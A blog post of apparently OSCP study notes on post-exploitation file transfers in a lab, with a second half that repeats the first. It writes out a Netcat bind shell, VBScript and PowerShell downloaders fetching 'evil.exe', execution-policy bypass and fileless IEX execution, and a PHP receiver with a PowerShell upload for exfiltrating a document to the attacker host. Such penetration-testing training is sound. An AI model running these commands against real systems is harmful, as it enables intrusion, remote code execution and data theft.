---
layout: post
title:  "OSCP Origin Part 16"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "File Transfers"
toc: true
comments: false
rating: 3.5
---

File Transfers

16. File Transfers

• Some post-exploitation actions include elevating privileges,expanding control into additional machines, installing backdoors, cleaning up evidence of theattack, uploading files and tools to the target machine, etc.

16.1.1 Dangers of Transferring Attack Tools

• First, our post-exploitation attack tools could be abused by malicious parties, which puts the client’sresources at risk. It is extremely important to document uploads and remove them after theassessment is completed.

• Second, antivirus software, which scans endpoint filesystems in search of pre-defined file signatures, becomes a huge frustration for us during this phase. This software, which is ubiquitousin most corporate environments, will detect our attack tools, quarantine them (rendering themuseless), and alert a system administrator.

• this will cost us a precious internal remote shell, or in extremecases, signal the effective end of our engagement. 

16.1.2 Installing pure ftpd

 let’s quickly install the Pure-FTPd server onour Kali attack machine. If you already have an FTP server configured on your Kali system.
 
• Install ftp server

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/1.jpg)

• Create user in ftpd server
• This script will automate the user creation

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/2.jpg)

kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd


• it creates relevant group and user
• configure folder permission
• restart the server

• We will make the script executable, then run it and enter “lab” as the password for the offsec userwhen prompted:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/3.jpg)


16.1.3 The Non-Interactive Shell


• Most Netcat-like tools provide a non-interactive shell, which means that programs that require userinput such as many file transfer programs or su and sudo tend to work poorly, if at all.
 
• Noninteractive shells also lack useful features like tab completion and job control.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/4.jpg)

• ls - non interactive command bc-> finish without user interaction.

• You are hopefully familiar with the ls command. This command is non-interactive, because it cancomplete without user interaction

• consider a typical FTP login session from our Debian lab client to our Kali system:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/5.jpg)

• let’s attempt an FTP session through a non interactive shell, in this case, Netcat.

• To begin, let’s assume we have compromised a Debian client and have obtained access to a Netcat bind shell. We’ll launch Netcat on our Debian client listening on port 4444 to simulate this:

student@debian:~$ nc -lvnp 4444 -e /bin/bash
listening on [any] 4444 ...

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/6.jpg)

• From our Kali system, we will connect to the listening shell and attempt the FTP session from Listing 466 again:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/7.jpg)

kali@kali:~$ nc -vn 10.11.0.128 4444
ftp 10.11.0.4
offseclab
bye
^C
kali@kali:~$

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/8.jpg)

• Behind the scenes, we are interacting with the FTP server, but we are not receiving any feedback inour shell.
 
• This is because the standard output from the FTP session (an interactive program) is not redirected correctly in a basic bind or reverse shell.
 
• This results in the loss of control of our shell.

------------------------------------------------------------------------

Upgrading a non interactive shell

• The Python interpreter, frequently installed on Linuxsystems, comes with a standard module named pty that allows for creation of pseudo-terminals.
 
• By using this module, we can spawn a separate process from our remote shell and obtain a fully interactive shell.

this is our kali machine

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/9.jpg)

kali@kali:~$ nc -vn 10.11.0.128 4444
(UNKNOWN) [10.11.0.128] 4444 (?) open
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:~$

• Immediately after running our Python command, we are greeted with a familiar Bash prompt.

• Let’stry connecting to our local FTP server again, this time through the pty shell and see how it behaves:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/10.jpg)

student@debian:~$ ftp 10.11.0.4
ftp 10.11.0.4
Connected to 10.11.0.4.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 09:16. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.11.0.4:student): offsec
offsec
331 User offsec OK. Password required
Password:offsec
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
bye
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
student@debian:~$


• This time, our interactive connection to the FTP server was successful (Listing 470) and when we quit, we were returned to our upgraded Bash prompt.
 
• This technique effectively provides aninteractive shell through a traditionally non-interactive channel and is one of the most popular upgrades to a standard non-interactive shell on Linux.

16.1.3.2 Exercises

(Reporting is not required for these exercises)

1.Start the Pure-FTPd FTP server on your Kali system, connect to it using the FTP client on theDebian lab VM, and observe how the interactive prompt works.

2.Attempt to log in to the FTP server from a Netcat reverse shell and see what happens.

3.Research alternatives methods to upgrade a non-interactive shell.

16.2 Transferring Files with Windows Hosts

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/11.jpg)

• In Unix-like environments, we will often find tools such as Netcat, curl, or wget preinstalled with the operating system. 
 
• which make downloading files from a remote machine relatively simple.

• However, on Windows machines the process is usually not as straightforward.

16.2.1 Non-Interactive FTP Download

• Windows operating systems ship with a default FTP client that can be used for file transfers. 
 
• As we’ve seen, the FTP client is an interactive program that requires input to complete so we need a creative solution in order to use FTP for file transfers.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/12.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/13.jpg)

• The ftp help option (-h) has some clues that might come to our aid:

• The ftp -s option accepts a text-based command list that effectively makes the client non interactive.

• On our attacking machine, we will set up an FTP server, and we will initiate a download request for the Netcat binary from the compromised Windows host.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/14.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/15.jpg)

•First, we will place a copy of nc.exe in our /ftphome directory:

•We have already installed and configured Pure-FTPd on our Kali machine, but we will restart it tomake sure the service is available:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/16.jpg)

• Next, we will build a text file of FTP commands we wish to execute, using the echo command as shown.

• This is kali machine

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/17.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/18.jpg)

C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt


• The command file begins with the open command, which initiates an FTP connection to the specified IP address.

• the script will authenticate as offsec with the USER command and supply the password, lab.

• At this point, we should have a successfully authenticated FTP connection and we can script the commands necessary to transfer our file.

• We will request a binary file transfer with bin and issue the GET request for nc.exe. Finally, we will close the connection with the bye command:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/19.jpg)

• In the above listing, we used -v to suppress any returned output, 
 -n to suppresses automatic login,and -s to indicate the name of our command file.
 
• When the ftp command in Listing above runs, our download should have executed, and a working copy of nc.exe should appear in our current directory:

C:\Users\offsec> ftp -v -n -s:ftp.txt
ftp> open 192.168.1.31 21
ftp> USER offsec
ftp> bin
ftp> GET nc.exe
ftp> bye
C:\Users\offsec> nc.exe -h
[v1.10 NT]
connect to somewhere: nc [-options] hostname port[s] [ports] ...
listen for inbound: nc -l -p port [options] [hostname] [port]
options:
 -d detach from console, stealth mode
 -e prog inbound program to exec [dangerous!!]
 -g gateway source-routing hop point[s], up to 8
 -G num source-routing pointer: 4, 8, 12, ...
 -h this cruft
 -i secs delay interval for lines sent, ports scanned
 -l listen mode, for inbound connects

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/20.jpg)


/ftphome = in kali machine we already setupped.

16.2.2 Windows Downloads Using Scripting Languages

• set of non-interactive echo commands, when pasted into a remote shell, will write out a wget.vbsscript that acts as a simple HTTP downloader:

• this is work as a simple http downloader wget.vbs.txt when pasted
in powershell or cmd.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/21.jpg)

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs


• We can run this (with cscript) to download files from our Kali machine:

C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
# - Executing the VBScript HTTP downloader script
# - http://10.11.0.4/evil.exe = getting path  #evil.exe = saving format


• copied to kali web root file for downloading

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/22.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/23.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/24.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/25.jpg)


-----------------------------------------------------------------------------------

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/26.jpg)

• In recent versions of windows power shell is easier.

• For more recent versions of Windows, we can use PowerShell as an even simpler downloadalternative.

• The example below shows an implementation of a downloader script using theSystem.Net.WebClient PowerShell class

C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

• Now we can use PowerShell to run the script and download our file.

• However, to ensure both correctand stealthy execution, we specify a number of options in the execution of the script as shown.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/27.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/28.jpg)


• First, we must allow execution of PowerShell scripts (which is restricted by default) with the -ExecutionPolicy keyword and Bypass value.
 
• Next, we will use -NoLogo and -NonInteractiveto hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively.
 
• The -NoProfile keyword will prevent PowerShell from loading the default profile (which is notneeded), and finally we specify the script file with -File:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/29.jpg)

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
file -File wget.ps1
# - Executing the PowerShell HTTP downloader script

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/30.jpg)

C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/
/10.11.0.4/evil.exe', 'new-exploit.exe')
# - Executing the PowerShell HTTP downloader script as a one-liner

• If we want to download and execute a PowerShell script without saving it to disk, we can once againuse the System.Net.Webclient class.
 
• This is done by combining the DownloadString method withthe Invoke-Expression cmdlet (IEX).

• To demonstrate this, we will create a simple PowerShell script on our Kali machine (Listing 482):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/31.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/32.jpg)




![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/33.jpg)

kali@kali:/var/www/html$ sudo cat helloworld.ps1Write-Output "Hello World"
# Listing 482 - The Hello World script hosted on our web server

• Next, we will run the script with the following command on our compromised Windows machine 

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/34.jpg)

C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('
http://10.11.0.4/helloworld.ps1')
Hello World


• The content of the PowerShell script was downloaded from our Kali machine and successfullyexecuted without saving it to the victim hard disk.


16.2.3 Windows Downloads with exe2hex and PowerShell

• In order to download a binary file from Kali to a compromised Windows host.

• Starting on our Kali machine, we will compress the binary we want to transfer, convert it to a hex string, and embed it into a Windows script.

• On the Windows machine, we will paste this script into our shell and run it.
 
• It will redirect the hexdata into powershell.exe, which will assemble it back into a binary. This will be done through a series of non-interactive commands.
 
• As an example, let’s use powershell.exe to transfer Netcat from our Kali Linux machine to our Windows client over a remote shell.

• We’ll start by locating and inspecting the nc.exe file on Kali Linux

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/35.jpg)

kali@kali:~$ locate nc.exe | grep binaries
/usr/share/windows-resources/binaries/nc.exe
kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .
kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe

• Although the binary is already quite small, we will reduce the file size to show how it’s done.

• We willuse upx, an executable packer (also known as a PE compression tool).

kali@kali:~$ upx -9 nc.exe
 Ultimate Packer for eXecutables
 Copyright (C) 1996 - 2018
UPX 3.95 Markus Oberhumer, Laszlo Molnar & John Reiser Aug 26th 2018
 File size Ratio Format Name
 -------------------- ------ ----------- -----------
 59392 -> 29696 50.00% win32/pe nc.exe
Packed 1 file.
kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/36.jpg)

• upx has optimized the file size of nc.exe, decreasing it by almost 50%.

• Despite thesmaller size, the Windows PE file is still functional and can be run as normal.

• Now that our file is optimized and ready for transfer
 
• we can convert nc.exe to a Windows script(.cmd) to run on the Windows machine,
 
• which will convert the file to hex and instruct powershell.exe to assemble it back into binary.
 
• We’ll use the excellent exe2hex tool for the conversion process:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/37.jpg)

kali@kali:~$ exe2hex -x nc.exe -p nc.cmd
[*] exe2hex v1.5.1
[+] Successfully wrote (PoSh) nc.cmd

• This creates a script named nc.cmd with contents like the following:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/38.jpg)

•  Notice how most of the commands in this script are non-interactive,
•  mostly consisting of echo commands.
•  Towards the end of the script, we find commands that rebuild the nc.exe  executableon the target machine:

powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=N
ew-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].S
ubstring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -enc
oding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
# - PowerShell command to rebuild nc.exe

• When we copy and paste this script into a shell on our Windows machine 
  and run it, we can see that it does, in fact, create a perfectly-working 
  copy of our original nc.exe.

C:\Users\offsec>powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$
h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte
]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};
set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
C:\Users\offsec> nc -h
[v1.10 NT]
connect to somewhere: nc [-options] hostname port[s] [ports] ...
listen for inbound: nc -l -p port [options] [hostname] [port]
options:
 -d detach from console, stealth mode
 -e prog inbound program to exec [dangerous!!]
 
 # - Using PowerShell to rebuild nc.exe

16.2.4 Windows Uploads Using Windows Scripting Languages

Upload from windows to kali

• In certain scenarios, we may need to exfiltrate data from a target network using a Windows client.
 
• This can be complex since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default.

• Fortunately, if outbound HTTP traffic is allowed, we can use the System.Net.WebClient PowerShellclass to upload data to our Kali machine through an HTTP POST request.

• To do this, we can create the following PHP script and save it as upload.php in our Kali web root directory, /var/www/html:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/39.jpg)

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
# Listing 490 - PHP script to receive HTTP POST request

•  The PHP code in Listing 490 will process an incoming file upload request and save the transferred data to the /var/www/uploads/ directory.
 
•  Next, we must create the uploads folder and modify its permissions, granting the www-data user ownership and subsequent write permissions:
 
kali@kali:/var/www$ sudo mkdir /var/www/uploads
kali@kali:/var/www$ ps -ef | grep apache
root 1946 1 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start
www-data 1947 1946 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start
kali@kali:/var/www$ sudo chown www-data: /var/www/uploads
kali@kali:/var/www$ ls -la
total 16
drwxr-xr-x 4 root root 4096 Feb 2 00:33 .
drwxr-xr-x 13 root root 4096 Sep 20 14:57 ..
drwxr-xr-x 2 root root 4096 Feb 2 00:33 html
drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:33 uploads
 
• Note that this would allow anyone interacting with uploads.php to upload files to our Kali virtual machine.
 
• With Apache and the PHP script ready to receive our file, we move to the compromised Windows host and invoke the Upload File method from the System.Net.WebClient class to upload the document we want to exfiltrate, 
 in this case, a file named important.docx:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/40.jpg)


C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11
.0.4/upload.php', 'important.docx')
# Listing 492 - PowerShell command to upload a file to the attacker machine

• After execution of the powershell command, we can verify the successful 
  transfer of the file:

kali@kali:/var/www/uploads$ ls -la
total 360
drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:38 .
drwxr-xr-x 4 root root 4096 Feb 2 00:33 ..
-rw-r--r-- 1 www-data www-data 359250 Feb 2 00:38 important.docx

--------------------------------------------------------------------------

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/41.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/42.jpg)
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/43.jpg)




![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/44.jpg)

16.2.5 Uploading Files with TFTP
 
• While the Windows-based file transfer methods shown above work on all Windows versions sinceWindows 7 and Windows Server 2008 R2, we may run into problems when encountering olderoperating systems. 

• PowerShell, while very powerful and often-used, is not installed by default on operating systems like Windows XP and Windows Server 2003, which are still found in someproduction networks.

• While both VBScript and the FTP client are present and will work, in this section we will discuss another file transfer method that may be effective in the field.

• TFTP is a UDP-based file transfer protocol and is often restricted by corporate egress fire wall rules.

• During a penetration test, we can use TFTP to transfer files from older Windows operating systems up to Windows XP and 2003. 
 
• This is a terrific tool for non-interactive file transfer, but it is not installed by default on systems running Windows 7, Windows 2008, and newer.
  
• For these reasons, TFTP is not an ideal file transfer protocol for most situations, but under the rightcircumstances, it has its advantages.
  
• Before we learn how to transfer files with TFTP, we first need to install and configure a TFTP server in Kali and create a directory to store and serve files. 
 
• Next, we update the ownership of the directoryso we can write files to it. We will run atftpd as a daemon on UDP port 69 and direct it to use thenewly created /tftp directory:


kali@kali:~$ sudo apt update && sudo apt install atftp
kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp

• On the Windows system, we will run the tftp client with -i to specify a binary image transfer, the IP address of our Kali system, the put command to initiate an upload, and finally the filename ofthe file to upload.

C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
Transfer successful: 359250 bytes in 96 second(s), 
3712 bytes/s


 For some incredibly interesting ways to use common Windows utilities for fileoperations, program execution, UAC bypass, and much more, see the Living OffThe Land Binaries And Scripts (LOLBAS) project,401 maintained by Oddvar Moeand several contributors, which aims to “document every binary, script, and library that can be used for [these] techniques.” For example, the certutil.exe402program can easily download arbitrary files and much more.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/45.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/46.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/47.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/48.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/49.jpg)


16.2.5.1 Exercises

(Reporting is not required for these exercises)

1.Use VBScript to transfer files in a non-interactive shell from Kali to Windows.

2.Use PowerShell to transfer files in a non-interactive shell from Kali to Windows and viceversa.

3.For PowerShell version 3 and above, which is present by default on Windows 8.1 andWindows 10, the cmdlet Invoke-WebRequest403 was added. Try to make use of it in order toperform both upload and download requests to your Kali machine.

4.Use TFTP to transfer files from a non-interactive shell from Kali to Windows.
 Note: 
 If you encounter problems, first attempt the transfer process within an interactive shell andwatch for issues that may cause problems in a non-interactive shell.
 
 summary

16.1.2.setup ftpd server

16.1.3.non interactive to interactive changing ftp server with python 
  module
  
16.2.windows machine restrictions netcat,wget,curl not avavilable.

16.2.1.create a txt file in windows which initialize ftp connection with kali machine and downlad the file

16.2.2.creation of wget.vbsscript that acts as a simple HTTP downloader
  which downlaod files from kali machine
  
• if ftp not available usefull
• if powershell available also it is done 

16.2.3.cchange netcat as binary file and transferring into victim(windows shell) then executing.

16.2.4.tftp,ftp not available we can use the System.Net.WebClient PowerShellclass to upload data to our Kali machine through an HTTP POST request.

16.2.5.VBScript and the FTP client are present and will work ; setup tftp another method;windows powershell not available.

Summary2


1. Install ftp server

sudo apt update && sudo apt -y install pure-ftpd


• Create user in ftpd server
• This script will automate the user creation

kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd

• it creates relevant group and user
• configure folder permission
• restart the server

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/50.jpg)


2.The Non iNteractive shell

• ftp login

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/51.jpg)

• listening on compromised debian client
• obtained access to a Netcat bind shell

student@debian:~$ nc -lvnp 4444 -e /bin/bash
listening on [any] 4444 ...

• From our Kali system, we will connect to the listening shell and attempt the FTP session from Listing 466 again:

kali@kali:~$ nc -vn 10.11.0.128 4444
ftp 10.11.0.4
offseclab
bye
^C

Upgrading a non interactive shell

• module named pty that allows for creation of pseudo-terminals.

• this module, we can spawn a separate process from our remote shell and obtain a fully interactive shell.

In kali machine

kali@kali:~$ nc -vn 10.11.0.128 4444
(UNKNOWN) [10.11.0.128] 4444 (?) open
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:~$

got interactive shell

student@debian:~$ ftp 10.11.0.4
ftp 10.11.0.4
Connected to 10.11.0.4.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 09:16. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.11.0.4:student): offsec
offsec
331 User offsec OK. Password required
Password:offsec
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
bye
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
student@debian:~$


3.Transferring Files with Windows Hosts

• Unix-like environments, we will often find tools such as Netcat, curl, or wget preinstalled with the operating system.

4.Non-Interactive FTP Download

Windows operating systems ship with a default FTP client that can be used for file transfers.

In windows system

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/52.jpg)

In our kali system

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/53.jpg)

• ftp -s option accepts a text-based command list that effectively makes the client non interactive.

 On our attacking machine(kali), we will set up an FTP server, and we will initiate a download request for the Netcat binary from the compromised Windows host.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/54.jpg)
 
 •First, we will place a copy of nc.exe in our /ftphome directory:
 
 •We have already installed and configured Pure-FTPd on our Kali machine, but we will restart it tomake sure the service is available:
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/55.jpg)
 
 • Next, we will build a text file of FTP commands we wish to execute, using the echo command as shown.
 
• below shell is compromised windows machine accessing from kali machine

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/56.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/57.jpg)
 
 C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt

 
 At this point, we should have a successfully authenticated FTP connection and we can script the commands necessary to transfer our file.
 (from kali to windows)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/58.jpg)
 
 When the ftp command in Listing above runs, our download should have executed, and a working copy of nc.exe should appear in our current directory:
 
 C:\Users\offsec> ftp -v -n -s:ftp.txt
ftp> open 192.168.1.31 21
ftp> USER offsec
ftp> bin
ftp> GET nc.exe
ftp> bye
C:\Users\offsec> nc.exe -h
[v1.10 NT]
connect to somewhere: nc [-options] hostname port[s] [ports] ...
listen for inbound: nc -l -p port [options] [hostname] [port]
options:
 -d detach from console, stealth mode
 -e prog inbound program to exec [dangerous!!]
 -g gateway source-routing hop point[s], up to 8
 -G num source-routing pointer: 4, 8, 12, ...
 -h this cruft
 -i secs delay interval for lines sent, ports scanned
 -l listen mode, for inbound connects
 
 /ftphome = in kali machine we already setupped.
 
 5.16.2.2 Windows Downloads Using Scripting Languages
 
•  downloading from kali to windows machine
 
•  this is work as a simple http downloader wget.vbs.txt when pasted
in powershell or cmd.

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs


• We can run this (with cscript) to download files from our Kali machine:

C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
# - Executing the VBScript HTTP downloader script
# - http://10.11.0.4/evil.exe = getting path  #evil.exe = saving format



• copied to kali web root file for downloading

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/59.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/60.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/61.jpg)

doing same thing with windows poershell


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/62.jpg)

• In recent versions of windows power shell is easier.

• The example below shows an implementation of a downloader script using theSystem.Net.WebClient PowerShell class

C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

• Now we can use PowerShell to run the script and download our file.

• However, to ensure both correctand stealthy execution, we specify a number of options in the execution of the script as shown.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/63.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/64.jpg)


• First, we must allow execution of PowerShell scripts (which is restricted by default) with the -ExecutionPolicy keyword and Bypass value.
